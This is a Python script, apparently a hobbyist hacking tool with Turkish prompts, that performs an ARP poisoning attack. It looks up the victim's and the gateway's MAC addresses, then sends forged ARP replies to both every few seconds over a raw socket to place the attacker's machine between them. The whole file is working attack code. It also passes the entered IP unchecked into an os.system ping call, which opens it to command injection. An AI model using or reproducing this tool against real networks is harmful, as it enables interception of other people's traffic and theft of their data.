import time
import socket
import struct
import binascii
from getmac import get_mac_address as macaddr
import os
sayac = 0
def get_arp(ip_addr,ag_karti):


        arp_file = open('/proc/net/arp','r')
        tamami = arp_file.read()
        arp_file.close()
        liste = []
        liste = tamami.split('\n')
        for i in liste:
                yeni = i.split(' ')
                yeni2 = []
                for j in yeni:
                        if(j!=' ' and j!=''):
                                yeni2.append(j)
                if(len(yeni2) > 5):
                        if(yeni2[0] == ip_addr and yeni2[5] == ag_karti):
                                return yeni2[3]+' '+yeni2[5]
                                break



def get_arp_with_ping(ip_addr,ag_karti):
        cevap = os.system("ping "+ip_addr+" -c 1")
        return get_arp(ip_addr,ag_karti)





def mac_to_bin(mac):
        hex1 = ''.join(mac.split(':'))
        bytelar = bytes.fromhex(hex1)
        return bytelar

print("                --------\n\n               ARPPOISONER\n\n            DEVELOPED BY KC4N6\n\n                ---------\n")

while True:
	ag_karti = input("[+][+]lutfen ag kartinizin adini giriniz: ")

	isletim_sistemi = input("[+][+]isletim sisteminiz unix ise 1 windows ise 2 ye basiniz: ")

	if(isletim_sistemi == "1"):
		s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))

	elif (isletim_sistemi == "2"):
		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.htons(0x0800))

	else:
		print("\n[--][--]gcerli bir rakam secmediniz default olarak unix secilmistir...")
		s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
	try:
		s.bind((ag_karti, socket.htons(0x0800)))
		break
	except:
		print("ag kartini dogru girdiginizden ve aga bagli oldugunuzdan emin olup tekrar deneyiniz...\n\n")

hacker_mac = macaddr()
hacker_mac = mac_to_bin(hacker_mac)

victimip = input("[+][+]Lütfen hedef makinenin ip adresini yaziniz: ")


if(get_arp(victimip,ag_karti) == None):
	print("[+][+]MEVCUT ARP TABLOSUNDA BU IP ADRESINE KAYITLI BIR MAC ADRESI YOKTUR. MAC ADRES TESPITI ICIN PING ATILIYOR...\n")
	victimmac = get_arp_with_ping(victimip,ag_karti)
	if(victimmac==None or victimmac.startswith("00:00:00:00:00:00")):
		print("[X][X]Agda boyle bir cihaz yoktur!!!\n\n")
		sayac = 1
	else:
		temp = victimmac.split(' ')
		victimmac = temp[0]
else:
	victimmac1 = get_arp(victimip,ag_karti).split(' ')
	victimmac =  victimmac1[0]


if(sayac !=1):
	victimmac = mac_to_bin(victimmac)
	gatewayip = input("\n[+][+]Lutfen gateway ip adresini giriniz: ")
	while True:
		try:
			gatewaymac = get_arp(gatewayip,ag_karti).split(' ')
			gatewaymac1 = gatewaymac[0]
			gateway_mac = mac_to_bin(gatewaymac1)
			break
		except:
			gatewayip = input("Girdiginiz gateway adresi yanlistir. Aga bagli oldugunuzdan ve gateway ip adresini dogru girdiginizden emin olarak tekrar deneyiniz: ")

	print("\n\n[->][->][->][->]BUTUN BILGILER TAMAM ARP ZEHIRLEME SALDIRISI BASLIYOR!!!!!\n\nATAGI DURDURMAK ICIN CTRL+C TUSLARINA BASINIZ...")
	code = b'\x08\x06'
	ethernet1 = victimmac + hacker_mac + code
	ethernet2 = gateway_mac + hacker_mac + code
	htype = b'\x00\x01'
	protype = b'\x08\x00'
	hsize = b'\x06'
	psize = b'\x04'

	opcode = b'\x00\x02'


	gateway_ip = socket.inet_aton(gatewayip)
	victim_ip = socket.inet_aton(victimip)

	victim_ARP = ethernet1 + htype + protype + hsize + psize + opcode + hacker_mac + gateway_ip + victimmac + victim_ip

	gateway_ARP = ethernet2 + htype + protype + hsize + psize + opcode + hacker_mac + victim_ip + gateway_mac + gateway_ip

	while True:
		try:
			s.send(victim_ARP)
			s.send(gateway_ARP)
			time.sleep(3)
		except:
			print("[X][X][X]CIKIS YAPILDI YINE BEKLERIZ!!!![X][X][X]")
			break
else:
	print("\n[X][X]CIKIS YAPILDI...")
